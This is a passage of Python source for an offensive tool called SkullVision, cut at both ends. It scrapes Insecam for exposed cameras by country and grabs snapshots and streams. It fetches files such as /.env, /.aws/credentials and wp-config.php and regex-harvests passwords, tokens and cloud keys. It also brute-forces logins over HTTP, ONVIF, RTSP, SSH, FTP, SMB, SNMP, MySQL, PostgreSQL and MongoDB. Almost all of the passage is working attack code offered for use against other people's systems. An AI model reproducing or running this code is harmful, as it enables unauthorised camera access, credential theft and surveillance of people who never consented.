        raw_ghost = f"Ghost credentials found: {len(ghost_results)}\n" + "\n".join([f"{g.get('username', 'unknown')}:{g.get('password', 'unknown')}" for g in ghost_results[:5]])
        self.log_activity("Ghost Extraction", "complete", f"{len(ghost_results)} credentials found", raw_ghost)
        
        self.log_activity("Session Analysis", "running", "Analyzing sessions")
        session_results = self.analyze_sessions(ip)
        raw_sessions = f"Session findings: {len(session_results)}"
        self.log_activity("Session Analysis", "complete", f"{len(session_results)} sessions found", raw_sessions)
        
        self.log_activity("Persistence Check", "running", "Checking for persistence mechanisms")
        persistence_results = self.check_persistence(ip)
        raw_persistence = f"Persistence findings: {len(persistence_results)}"
        self.log_activity("Persistence Check", "complete", f"{len(persistence_results)} findings", raw_persistence)
        
        self.log_activity("Lateral Movement", "running", "Checking for lateral movement vectors")
        lateral_results = self.check_lateral_movement(ip)
        raw_lateral = f"Lateral movement vectors: {len(lateral_results)}"
        self.log_activity("Lateral Movement", "complete", f"{len(lateral_results)} vectors found", raw_lateral)
        
        return True
    
    def record_streams_complete(self, ip: str):
        if not self.detected_streams:
            self.vis.warning("No streams to record")
            return
        
        raw_streams = []
        for stream_type, urls in self.detected_streams.items():
            for url in urls[:3]:
                try:
                    if url.startswith('rtsp://'):
                        self.vis.info(f"RTSP stream available: {url}", "Can be recorded with VLC/FFmpeg")
                        raw_streams.append(f"RTSP: {url}")
                    else:
                        response = self.session.get(url, timeout=HTTP_TIMEOUT, stream=True)
                        if response.status_code == 200:
                            content_type = response.headers.get('Content-Type', '')
                            size = response.headers.get('Content-Length', 'unknown')
                            self.vis.info(f"Stream recordable: {url}", f"Type: {content_type}, Size: {size}")
                            raw_streams.append(f"HTTP: {url} - {content_type} ({size} bytes)")
                except Exception as e:
                    self.vis.debug(f"Failed to record stream: {url}", str(e))
    
    def capture_screenshots_complete(self, ip: str):
        if not self.open_ports:
            self.vis.warning("No open ports found for screenshot capture")
            return
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        snapshot_paths = [
            '/snapshot', '/snapshot.cgi', '/snapshot.jpg', '/snapshot.jpeg',
            '/image', '/image.jpg', '/image.jpeg', '/capture', '/capture.cgi',
            '/screenshot', '/screenshot.jpg', '/cgi-bin/snapshot',
            '/video/snapshot', '/api/snapshot', '/camera/snapshot'
        ]
        
        for path in snapshot_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                
                content_type = response.headers.get('Content-Type', '')
                if response.status_code == 200 and 'image' in content_type:
                    filename = f"screenshot_{ip.replace('.', '_')}_{int(time.time())}.jpg"
                    with open(filename, 'wb') as f:
                        f.write(response.content)
                    self.vis.success(f"Screenshot saved: {filename}", f"{len(response.content)} bytes")
                    break
            except:
                continue
    
    def ghost_extraction_complete(self, ip: str) -> List[Dict]:
        ghost_results = []
        if not self.open_ports:
            return ghost_results
        
        paths = [
            '/config.ini', '/settings.conf', '/camera.conf',
            '/credentials.txt', '/passwords.txt', '/auth.conf',
            '/web.conf', '/app.conf', '/system.conf',
            '/.env', '/.env.local', '/config.php', '/wp-config.php',
            '/settings.json', '/config.json', '/secrets.yml',
            '/.htaccess', '/.htpasswd', '/.git/config',
            '/.aws/credentials', '/.azure/credentials', '/.gcp/credentials',
            '/docker-compose.yml', '/package.json', '/composer.json',
            '/requirements.txt', '/application.properties', '/appsettings.json'
        ]
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        for path in paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    content = response.text
                    patterns = [
                        (r'username\s*[=:]\s*([^\s\n]+)', 'username'),
                        (r'password\s*[=:]\s*([^\s\n]+)', 'password'),
                        (r'user\s*[=:]\s*([^\s\n]+)', 'username'),
                        (r'pass\s*[=:]\s*([^\s\n]+)', 'password'),
                        (r'admin\s*[=:]\s*([^\s\n]+)', 'username'),
                        (r'api_key\s*[=:]\s*([^\s\n]+)', 'api_key'),
                        (r'token\s*[=:]\s*([^\s\n]+)', 'token'),
                        (r'secret\s*[=:]\s*([^\s\n]+)', 'secret'),
                        (r'AWS_SECRET_ACCESS_KEY\s*[=:]\s*([^\s\n]+)', 'aws_secret'),
                        (r'AWS_ACCESS_KEY_ID\s*[=:]\s*([^\s\n]+)', 'aws_key'),
                        (r'GITHUB_TOKEN\s*[=:]\s*([^\s\n]+)', 'github_token'),
                        (r'JWT_SECRET\s*[=:]\s*([^\s\n]+)', 'jwt_secret'),
                        (r'DB_PASSWORD\s*[=:]\s*([^\s\n]+)', 'db_password')
                    ]
                    
                    for pattern, key in patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            self.vis.credential_ghost_found(f"{key}={match}", path)
                            ghost_results.append({key: match, 'source': path})
            except:
                continue
        
        return ghost_results
    
    def analyze_sessions(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        session_paths = ['/session', '/api/session', '/auth/session', '/user/session', '/login/session']
        for path in session_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code == 200:
                    results.append({'path': path, 'status': response.status_code})
                    self.vis.info(f"Session endpoint found: {path}")
            except:
                continue
        
        return results
    
    def check_persistence(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        persistence_paths = [
            '/cron', '/crontab', '/systemd', '/init.d',
            '/startup', '/boot', '/autorun', '/autostart',
            '/persistence', '/service', '/daemon', '/backdoor'
        ]
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        for path in persistence_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code in [200, 401, 403]:
                    results.append({'path': path, 'status': response.status_code})
                    self.vis.info(f"Persistence mechanism found: {path}")
            except:
                continue
        
        return results
    
    def check_lateral_movement(self, ip: str) -> List[Dict]:
        results = []
        if not self.open_ports:
            return results
        
        lateral_paths = [
            '/ssh', '/rdp', '/vnc', '/telnet', '/ftp',
            '/smb', '/nfs', '/sftp', '/scp', '/rsync'
        ]
        
        port = 80 if 80 in self.open_ports else self.open_ports[0]
        protocol = "https" if port in HTTPS_PORTS else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        for path in lateral_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                if response.status_code in [200, 401, 403]:
                    results.append({'path': path, 'status': response.status_code})
                    self.vis.info(f"Lateral movement vector found: {path}")
            except:
                continue
        
        return results
    
    def phase_report(self, ip: str):
        self.vis.header("📊 PHASE 5: REPORT GENERATION - 80 Activities", "═", 70)
        self.vis.subheader("Generating Detailed Report", 1)
        
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        report_summary = f"""
{G}📊 Target Information:{W}
  IP: {C}{ip}{W}
  Brand: {G}{self.brand or 'Unknown'}{W}
  Open Ports: {G}{len(self.open_ports)}{W}
  RTSP Ports: {G}{len(self.rtsp_ports)}{W}

{G}🎯 Findings:{W}
  Vulnerabilities: {R if len(self.vulnerabilities) > 0 else G}{len(self.vulnerabilities)}{W}
  Credentials Found: {G}{len(self.credentials_found)}{W}
  Ghost Credentials: {PURPLE}{len(self.ghost_credentials)}{W}
  CVEs Found: {GOLD}{len(self.cves_found)}{W}
  Streams Found: {G}{len(self.detected_streams)}{W}
  Exploits Found: {R}{len(self.exploits_found)}{W}
  Bruteforce Results: {Y}{len(self.bruteforce_results)}{W}

{G}⏱️ Performance:{W}
  Total Time: {C}{elapsed:.1f} seconds{W}
  Activities: {G}{self.activity_count}/{self.total_activities}{W}
"""
        print(report_summary)
        
        report = {
            'target': ip,
            'timestamp': datetime.now().isoformat(),
            'brand': self.brand,
            'open_ports': self.open_ports,
            'rtsp_ports': self.rtsp_ports,
            'vulnerabilities': self.vulnerabilities,
            'credentials': self.credentials_found,
            'ghost_credentials': self.ghost_credentials,
            'cves': self.cves_found,
            'streams': self.detected_streams,
            'exploits': self.exploits_found,
            'bruteforce_results': self.bruteforce_results,
            'activities': self.scan_data['activities'],
            'elapsed': elapsed,
            'scan_summary': {
                'total_ports_scanned': len(COMMON_PORTS),
                'total_credentials_tested': len(self.credentials_found) * 10,
                'total_vulnerabilities_found': len(self.vulnerabilities)
            }
        }
        
        filename = f"skullvision_report_{ip.replace('.', '_')}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        self.vis.success(f"Report saved to: {filename}")
        
        self.generate_html_report(ip, report)
    
    def generate_html_report(self, ip: str, report: Dict):
        try:
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SkullVision Report - {ip}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #ff4444; border-bottom: 3px solid #ff4444; padding-bottom: 10px; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }}
        .card {{ background: #f8f9fa; padding: 15px; border-radius: 8px; border-left: 4px solid #007bff; }}
        .card-critical {{ border-left-color: #ff4444; }}
        .card-high {{ border-left-color: #ff8800; }}
        .card-medium {{ border-left-color: #ffcc00; }}
        .card-low {{ border-left-color: #00cc44; }}
        .card-number {{ font-size: 24px; font-weight: bold; }}
        .section {{ margin: 30px 0; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th {{ background: #333; color: white; padding: 10px; text-align: left; }}
        td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
        tr:hover {{ background: #f5f5f5; }}
        .severity-critical {{ color: #ff4444; font-weight: bold; }}
        .severity-high {{ color: #ff8800; font-weight: bold; }}
        .severity-medium {{ color: #ffcc00; font-weight: bold; }}
        .severity-low {{ color: #00cc44; font-weight: bold; }}
        .timestamp {{ color: #666; font-size: 0.9em; }}
    </style>
</head>
<body>
<div class="container">
    <h1>📡 SkullVision Security Assessment Report</h1>
    <p class="timestamp">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p><strong>Target:</strong> {ip}</p>
    <p><strong>Brand:</strong> {report.get('brand', 'Unknown')}</p>
    
    <div class="summary">
        <div class="card">
            <div class="card-number">{len(report.get('open_ports', []))}</div>
            <div>Open Ports</div>
        </div>
        <div class="card">
            <div class="card-number">{len(report.get('vulnerabilities', []))}</div>
            <div>Vulnerabilities</div>
        </div>
        <div class="card">
            <div class="card-number">{len(report.get('credentials', []))}</div>
            <div>Credentials Found</div>
        </div>
        <div class="card">
            <div class="card-number">{len(report.get('cves', []))}</div>
            <div>CVEs Found</div>
        </div>
        <div class="card">
            <div class="card-number">{len(report.get('streams', {}))}</div>
            <div>Streams Found</div>
        </div>
        <div class="card">
            <div class="card-number">{len(report.get('exploits', []))}</div>
            <div>Exploits Found</div>
        </div>
    </div>
    
    <div class="section">
        <h2>🔴 Vulnerabilities</h2>
        <table>
            <tr><th>Type</th><th>Location</th><th>Severity</th></tr>
"""
            for vuln in report.get('vulnerabilities', [])[:20]:
                severity = vuln.get('severity', 'low')
                html_content += f"""
            <tr>
                <td>{vuln.get('type', 'Unknown')}</td>
                <td>{vuln.get('location', 'N/A')}</td>
                <td class="severity-{severity}">{severity.upper()}</td>
            </tr>
"""
            html_content += """
        </table>
    </div>
    
    <div class="section">
        <h2>🔑 Credentials Found</h2>
        <table>
            <tr><th>Username</th><th>Password</th><th>Port</th><th>Service</th></tr>
"""
            for cred in report.get('credentials', [])[:20]:
                html_content += f"""
            <tr>
                <td>{cred.get('username', 'Unknown')}</td>
                <td>{cred.get('password', 'Unknown')}</td>
                <td>{cred.get('port', 'N/A')}</td>
                <td>{cred.get('service', 'Unknown')}</td>
            </tr>
"""
            html_content += """
        </table>
    </div>
    
    <div class="section">
        <h2>🛡️ CVEs Found</h2>
        <table>
            <tr><th>CVE</th><th>Brand</th></tr>
"""
            for cve in report.get('cves', [])[:20]:
                html_content += f"""
            <tr>
                <td>{cve.get('cve', 'Unknown')}</td>
                <td>{cve.get('brand', 'Unknown')}</td>
            </tr>
"""
            html_content += """
        </table>
    </div>
    
    <div class="section">
        <h2>📡 Streams Found</h2>
        <table>
            <tr><th>URL</th><th>Type</th></tr>
"""
            for stream_type, urls in report.get('streams', {}).items():
                for url in urls[:5]:
                    html_content += f"""
            <tr>
                <td>{url}</td>
                <td>{stream_type}</td>
            </tr>
"""
            html_content += """
        </table>
    </div>
</div>
</body>
</html>
"""
            filename = f"report_{ip.replace('.', '_')}_{int(time.time())}.html"
            with open(filename, 'w') as f:
                f.write(html_content)
            self.vis.success(f"HTML report saved to: {filename}")
        except Exception as e:
            self.vis.warning(f"Failed to generate HTML report: {e}")
    
    def mode_cctv_scanner(self):
        self.vis.header("📷 CCTV SCANNER", "═", 70)
        
        self.show_country_menu()
        
        country_choice = input(f"\n{C}Select country number: {W}").strip()
        try:
            country_idx = int(country_choice) - 1
            if 0 <= country_idx < len(COUNTRIES):
                country = COUNTRIES[country_idx]
            else:
                self.vis.error("Invalid country selection")
                return
        except ValueError:
            self.vis.error("Invalid input")
            return
        
        print(f"""
{Y}Select scan mode:{W}
{G}1.{W} IP Addresses only
{G}2.{W} Image URLs only  
{G}3.{W} Both IPs and URLs
{G}4.{W} Full scan with credential testing
{G}5.{W} Deep scan (all ports, credentials, streams)
""")
        mode_choice = input(f"\n{C}Select mode (1-5): {W}").strip()
        modes = {'1': 'ips', '2': 'urls', '3': 'both', '4': 'full', '5': 'deep'}
        mode = modes.get(mode_choice, 'full')
        
        self.vis.info(f"Scanning cameras in: {country} (mode: {mode})")
        
        results = self.scan_cctv_country(country, mode)
        
        if results:
            self.vis.success(f"Found {len(results)} camera entries")
            filename = f"cctv_{country}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                for item in results:
                    f.write(str(item) + '\n')
            self.vis.success(f"Results saved to: {filename}")
        else:
            self.vis.warning("No cameras found for this country")
    
    def show_country_menu(self):
        print(f"\n{Y}Available Countries:{W}")
        print("-" * 60)
        cols = 4
        for i in range(0, len(COUNTRIES), cols):
            line = ""
            for j in range(cols):
                if i + j < len(COUNTRIES):
                    num = str(i + j + 1).rjust(3)
                    country = COUNTRIES[i + j]
                    line += f"{G}{num}) {Y}{country.ljust(6)}"
            print(line)
        print("-" * 60)
    
    def scan_cctv_country(self, country_code: str, mode: str = 'full') -> List[Dict]:
        results = []
        headers = {"user-agent": random.choice(USER_AGENTS)}
        
        try:
            self.vis.info(f"Scanning Insecam for {country_code}...")
            
            if not REQUESTS_AVAILABLE:
                self.vis.error("Requests module not available")
                return results
            
            page_req = self.session.get(
                f"http://www.insecam.org/en/bycountry/{country_code}", 
                timeout=10
            )
            page_req.raise_for_status()
            
            last_page_matches = re.findall(r'pagenavigator\("\\?page=", (\d+)', page_req.text)
            if not last_page_matches:
                self.vis.warning("Could not determine total pages")
                return results
            
            last_page = int(last_page_matches[0])
            self.vis.info(f"Found {last_page} pages of cameras")
            
            for page in range(min(last_page, 30)):
                try:
                    req = self.session.get(
                        f"http://www.insecam.org/en/bycountry/{country_code}/?page={page}",
                        timeout=10
                    )
                    req.raise_for_status()
                    
                    if mode in ['ips', 'both', 'full', 'deep']:
                        ips = re.findall(r"http://(\d+\.\d+\.\d+\.\d+:\d+)", req.text)
                        for ip in ips:
                            results.append({
                                'type': 'ip',
                                'url': f"http://{ip}",
                                'ip': ip.split(':')[0],
                                'port': int(ip.split(':')[1])
                            })
                    
                    if mode in ['urls', 'both', 'full', 'deep'] and BEAUTIFULSOUP_AVAILABLE:
                        soup = BeautifulSoup(req.text, 'html.parser')
                        previews = soup.findAll('div', {'class': "thumbnail-item__preview"})
                        for preview in previews:
                            for img in preview.find_all('img'):
                                if img.get('src'):
                                    results.append({
                                        'type': 'image',
                                        'url': img['src'],
                                        'ip': '',
                                        'port': 0
                                    })
                    
                    time.sleep(0.3)
                    self.vis.progress(page + 1, min(last_page, 30), "Scraping pages")
                    
                except Exception as e:
                    continue
                    
        except Exception as e:
            self.vis.error(f"Failed to connect to Insecam.org: {e}")
            return results
        
        print()
        return results
    
    def mode_bruteforce(self, target: str = None):
        self.vis.header("🔓 BRUTEFORCE ENGINE - 10000+ CREDENTIALS", "═", 70)
        
        if not target:
            target = input(f"{C}Enter target (IP or IP:PORT): {W}").strip()
        
        ip, port = self.parse_target(target)
        if not ip:
            self.vis.error(f"Invalid target: {target}")
            return
        
        self.target_ip = ip
        
        print(f"""
{Y}Select bruteforce type:{W}
{G}1.{W} HTTP Basic Auth
{G}2.{W} ONVIF
{G}3.{W} RTSP
{G}4.{W} SSH
{G}5.{W} FTP
{G}6.{W} SMB
{G}7.{W} SNMP
{G}8.{W} MySQL
{G}9.{W} PostgreSQL
{G}10.{W} MongoDB
{G}11.{W} Redis
{G}12.{W} All Services
{G}13.{W} Custom Service
""")
        bf_choice = input(f"\n{C}Select type (1-13): {W}").strip()
        
        print(f"""
{Y}Select credential source:{W}
{G}1.{W} Use default/common credentials (10000+)
{G}2.{W} Provide custom username file
{G}3.{W} Provide custom password file
{G}4.{W} Provide both custom files
{G}5.{W} Generate random credentials
""")
        cred_choice = input(f"\n{C}Select source (1-5): {W}").strip()
        
        usernames, passwords = self.get_credentials_complete(cred_choice)
        
        if not usernames or not passwords:
            self.vis.error("No credentials provided")
            return
        
        self.run_bruteforce_complete(ip, port, usernames, passwords, bf_choice)
    
    def get_credentials_complete(self, cred_choice: str) -> Tuple[List[str], List[str]]:
        usernames = []
        passwords = []
        
        if cred_choice == '1':
            for username, pass_list in CREDENTIALS_DB.items():
                usernames.append(username)
                passwords.extend(pass_list)
            usernames = list(set(usernames))
            passwords = list(set(passwords))[:100]
        elif cred_choice == '2':
            file_path = input(f"\n{C}Username file path: {W}").strip()
            try:
                with open(file_path, 'r') as f:
                    usernames = [line.strip() for line in f if line.strip()]
            except:
                self.vis.error("Failed to read username file")
                return [], []
            passwords = ['admin', 'password', '12345', '123456', 'root', 'pass']
        elif cred_choice == '3':
            file_path = input(f"\n{C}Password file path: {W}").strip()
            try:
                with open(file_path, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                self.vis.error("Failed to read password file")
                return [], []
            usernames = ['admin', 'root', 'user', 'operator']
        elif cred_choice == '4':
            user_file = input(f"\n{C}Username file path: {W}").strip()
            pass_file = input(f"\n{C}Password file path: {W}").strip()
            try:
                with open(user_file, 'r') as f:
                    usernames = [line.strip() for line in f if line.strip()]
                with open(pass_file, 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                self.vis.error("Failed to read credential files")
                return [], []
        else:
            usernames = ['admin', 'root', 'user', 'test', 'guest', 'demo']
            passwords = ['password', '123456', 'admin', 'root', 'qwerty', 'letmein', 'welcome']
        
        return usernames, passwords
    
    def run_bruteforce_complete(self, ip: str, port: Optional[int], usernames: List[str], 
                                passwords: List[str], bf_type: str):
        self.vis.info(f"Starting bruteforce on {ip} with {len(usernames)} usernames and {len(passwords)} passwords")
        raw_bruteforce = []
        
        if bf_type == '1':
            ports = [port] if port else [80, 443, 8080, 8443, 8000, 8888]
            self.bruteforce_http_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '2':
            ports = [port] if port else ONVIF_PORTS
            self.bruteforce_onvif_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '3':
            ports = [port] if port else RTSP_PORTS
            self.bruteforce_rtsp_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '4':
            ports = [port] if port else SSH_PORTS
            self.bruteforce_ssh_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '5':
            ports = [port] if port else FTP_PORTS
            self.bruteforce_ftp_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '6':
            ports = [port] if port else SMB_PORTS
            self.bruteforce_smb_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '7':
            ports = [port] if port else SNMP_PORTS
            self.bruteforce_snmp_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '8':
            ports = [port] if port else MYSQL_PORTS
            self.bruteforce_mysql_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '9':
            ports = [port] if port else POSTGRES_PORTS
            self.bruteforce_postgres_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '10':
            ports = [port] if port else MONGODB_PORTS
            self.bruteforce_mongodb_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '11':
            ports = [port] if port else REDIS_PORTS
            self.bruteforce_redis_complete(ip, ports, usernames, passwords, raw_bruteforce)
        elif bf_type == '12':
            self.bruteforce_all_complete(ip, usernames, passwords, raw_bruteforce)
        else:
            self.vis.error("Invalid bruteforce type")
            return
        
        self.log_activity("Bruteforce Complete", "complete", f"Found {len(self.bruteforce_results)} valid credentials", "\n".join(raw_bruteforce[:20]))
        
        if self.bruteforce_results:
            filename = f"bruteforce_{ip}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(self.bruteforce_results, f, indent=2)
            self.vis.success(f"Results saved to: {filename}")
    
    def bruteforce_http_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        self.vis.info(f"Bruteforcing HTTP on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        url = f"{'https' if port in HTTPS_PORTS else 'http'}://{ip}:{port}"
                        response = self.session.get(url, auth=(username, password),
                                                   timeout=CREDENTIAL_TIMEOUT)
                        if response.status_code == 200:
                            self.vis.credential_found(username, password, url, "HTTP")
                            raw_output.append(f"HTTP: {username}:{password} @ {url}")
                            self.bruteforce_results.append({
                                'service': 'HTTP',
                                'port': port,
                                'username': username,
                                'password': password,
                                'url': url
                            })
                    except:
                        pass
    
    def bruteforce_onvif_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        self.vis.info(f"Bruteforcing ONVIF on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        if self.test_onvif_creds(ip, port, username, password):
                            url = f"http://{ip}:{port}/onvif"
                            self.vis.credential_found(username, password, url, "ONVIF")
                            raw_output.append(f"ONVIF: {username}:{password} @ {url}")
                            self.bruteforce_results.append({
                                'service': 'ONVIF',
                                'port': port,
                                'username': username,
                                'password': password,
                                'url': url
                            })
                    except:
                        pass
    
    def test_onvif_creds(self, ip: str, port: int, username: str, password: str) -> bool:
        try:
            envelope = f'''<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body>
    <tds:GetDeviceInformation/>
  </s:Body>
</s:Envelope>'''
            auth = base64.b64encode(f"{username}:{password}".encode()).decode()
            headers = {
                'Content-Type': 'application/soap+xml; charset=utf-8',
                'Authorization': f'Basic {auth}'
            }
            url = f"http://{ip}:{port}/onvif/device_service"
            response = self.session.post(url, data=envelope, headers=headers,
                                    timeout=ONVIF_ATTEMPT_TIMEOUT)
            return response.status_code == 200 and 'DeviceInformation' in response.text
        except:
            return False
    
    def bruteforce_rtsp_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        self.vis.info(f"Bruteforcing RTSP on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        if self._test_rtsp_creds(ip, port, username, password):
                            url = f"rtsp://{ip}:{port}/"
                            self.vis.credential_found(username, password, url, "RTSP")
                            raw_output.append(f"RTSP: {username}:{password} @ {url}")
                            self.bruteforce_results.append({
                                'service': 'RTSP',
                                'port': port,
                                'username': username,
                                'password': password,
                                'url': url
                            })
                    except:
                        pass
    
    def bruteforce_ssh_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        if not PARAMIKO_AVAILABLE:
            self.vis.warning("Paramiko not available, skipping SSH bruteforce")
            return
        self.vis.info(f"Bruteforcing SSH on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, port=port, username=username, password=password, timeout=3)
                        client.close()
                        self.vis.credential_found(username, password, f"ssh://{ip}:{port}", "SSH")
                        raw_output.append(f"SSH: {username}:{password} @ ssh://{ip}:{port}")
                        self.bruteforce_results.append({
                            'service': 'SSH',
                            'port': port,
                            'username': username,
                            'password': password,
                            'url': f"ssh://{ip}:{port}"
                        })
                    except:
                        pass
    
    def bruteforce_ftp_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        self.vis.info(f"Bruteforcing FTP on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(ip, port, timeout=3)
                        ftp.login(username, password)
                        ftp.quit()
                        self.vis.credential_found(username, password, f"ftp://{ip}:{port}", "FTP")
                        raw_output.append(f"FTP: {username}:{password} @ ftp://{ip}:{port}")
                        self.bruteforce_results.append({
                            'service': 'FTP',
                            'port': port,
                            'username': username,
                            'password': password,
                            'url': f"ftp://{ip}:{port}"
                        })
                    except:
                        pass
    
    def bruteforce_smb_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        if not SMB_AVAILABLE:
            self.vis.warning("SMB module not available, skipping SMB bruteforce")
            return
        self.vis.info(f"Bruteforcing SMB on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        smbclient.register_session(ip, username=username, password=password, port=port)
                        shares = smbclient.list_shares(ip)
                        if shares:
                            self.vis.credential_found(username, password, f"smb://{ip}:{port}", "SMB")
                            raw_output.append(f"SMB: {username}:{password} @ smb://{ip}:{port}")
                            self.bruteforce_results.append({
                                'service': 'SMB',
                                'port': port,
                                'username': username,
                                'password': password,
                                'url': f"smb://{ip}:{port}"
                            })
                    except:
                        pass
    
    def bruteforce_snmp_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        if not SNMP_AVAILABLE:
            self.vis.warning("SNMP module not available, skipping SNMP bruteforce")
            return
        self.vis.info(f"Bruteforcing SNMP on ports: {ports}")
        for port in ports:
            for password in passwords:
                try:
                    errorIndication, errorStatus, errorIndex, varBinds = next(
                        getCmd(SnmpEngine(),
                              CommunityData(password),
                              UdpTransportTarget((ip, port)),
                              ContextData(),
                              ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)))
                    )
                    if not errorIndication:
                        self.vis.credential_found('', password, f"snmp://{ip}:{port}", "SNMP")
                        raw_output.append(f"SNMP: community={password} @ snmp://{ip}:{port}")
                        self.bruteforce_results.append({
                            'service': 'SNMP',
                            'port': port,
                            'community': password,
                            'url': f"snmp://{ip}:{port}"
                        })
                except:
                    pass
    
    def bruteforce_mysql_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        if not MYSQL_AVAILABLE:
            self.vis.warning("MySQL module not available, skipping MySQL bruteforce")
            return
        self.vis.info(f"Bruteforcing MySQL on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        conn = mysql.connector.connect(
                            host=ip, port=port, user=username, password=password, connection_timeout=3
                        )
                        conn.close()
                        self.vis.credential_found(username, password, f"mysql://{ip}:{port}", "MySQL")
                        raw_output.append(f"MySQL: {username}:{password} @ mysql://{ip}:{port}")
                        self.bruteforce_results.append({
                            'service': 'MySQL',
                            'port': port,
                            'username': username,
                            'password': password,
                            'url': f"mysql://{ip}:{port}"
                        })
                    except:
                        pass
    
    def bruteforce_postgres_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        if not POSTGRES_AVAILABLE:
            self.vis.warning("PostgreSQL module not available, skipping PostgreSQL bruteforce")
            return
        self.vis.info(f"Bruteforcing PostgreSQL on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        conn = psycopg2.connect(
                            host=ip, port=port, user=username, password=password, connect_timeout=3
                        )
                        conn.close()
                        self.vis.credential_found(username, password, f"postgresql://{ip}:{port}", "PostgreSQL")
                        raw_output.append(f"PostgreSQL: {username}:{password} @ postgresql://{ip}:{port}")
                        self.bruteforce_results.append({
                            'service': 'PostgreSQL',
                            'port': port,
                            'username': username,
                            'password': password,
                            'url': f"postgresql://{ip}:{port}"
                        })
                    except:
                        pass
    
    def bruteforce_mongodb_complete(self, ip: str, ports: List[int], usernames: List[str], passwords: List[str], raw_output: List[str]):
        if not MONGODB_AVAILABLE:
            self.vis.warning("MongoDB module not available, skipping MongoDB bruteforce")
            return
        self.vis.info(f"Bruteforcing MongoDB on ports: {ports}")
        for port in ports:
            for username in usernames:
                for password in passwords:
                    try:
                        client = pymongo.MongoClient(f"mongodb://{username}:{password}@{ip}:{port}/", serverSelectionTimeoutMS=3000)
                        client.server_info()
                        client.close()
                        self.vis.credential_found(username, password, f"mongodb://{ip}:{port}", "MongoDB")
                        raw_output.append(f"MongoDB: {username}:{password} @ mongodb://{ip}:{port}")
                        self.bruteforce_results.append({
                            'service': 'MongoDB',
                            'port': port,
